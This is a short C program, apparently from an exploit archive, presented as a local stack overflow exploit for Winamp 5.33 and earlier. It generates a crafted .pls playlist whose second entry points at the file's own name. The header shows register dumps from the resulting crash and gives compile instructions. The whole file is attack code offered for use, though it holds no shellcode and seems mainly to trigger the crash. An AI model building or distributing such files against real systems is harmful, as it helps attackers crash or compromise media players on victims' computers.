/*
|-----------------------------------------------------------------------------|
||------------winamp <= 5.33 local stack overflow    (.pls
file)-------------||
||with this program you generate a file for winamp<=5.33 local stack
overflow||
||usage :
||
||      winamp_expl.exe <file_output.pls>
||
||
||
||    eax:00001D64
||
||    ecx:00032F64
||
||    edx:7C91EB94
||
||    ebx:0000007C
||
||    esp:00035F5C
||
||    ebp:00035F64
||
||    esi:00000000
||
||    edi:00037594
||
||    eip:0045FFE5
||
||
||
||     compile with dev-c++ 4.9.9.2
||
||
||
|| warning: after compiling do not rename a file
||
||
||
||            by [wHITe_ShEEp]
||
||---------------------------------------------------------------------------||
|-----------------------------------------------------------------------------|
*/

#include <stdio.h>




int main(int argc, char *argv[])
{
    FILE *pls;

    if (argc < 2){
       printf("usage: winamp_expl.exe <file.pls>\n");
       printf("coded by [wHITe_ShEEp]");
       return 0;
       }

       if(!(pls = fopen(argv[1], "w"))) {
        printf("Error");
        return 0;
        }
    fputs("[playlist]\n",pls);
    fputs("File1= A\n", pls);
    fputs("Title1=exploit\n",pls);
    fputs("Length1=-1\n",pls);
    fputs("File2=",pls);
    fputs(argv[1], pls);
    fputs("\n",pls);
    fputs("Title2=exploit\n",pls);
    fputs("Length2=-1\n",pls);
    fputs("NumberOfEntries=2\n",pls);
    fputs("Version=2",pls);
    fclose(pls);
    printf("file successiful created");
    return 0;
}
